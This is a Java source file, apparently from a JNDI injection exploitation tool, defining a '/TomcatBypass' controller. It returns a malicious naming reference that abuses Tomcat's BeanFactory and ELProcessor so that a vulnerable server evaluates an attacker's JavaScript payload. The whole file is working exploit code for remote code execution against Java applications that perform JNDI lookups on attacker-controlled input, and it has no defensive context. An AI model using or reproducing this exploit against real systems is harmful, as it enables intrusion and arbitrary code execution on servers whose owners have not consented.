package map.jndi.controller.bypass;

import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.controller.BasicController;
import map.jndi.util.PayloadUtil;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/TomcatBypass")
public class TomcatBypassController extends BasicController {
    @Override
    public Object process(byte[] byteCode) {
        System.out.println("[Reference] Factory: BeanFactory + ELProcessor");

        String code = PayloadUtil.getJavaScriptPayload(byteCode);

        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\")"));
        return ref;
    }
}
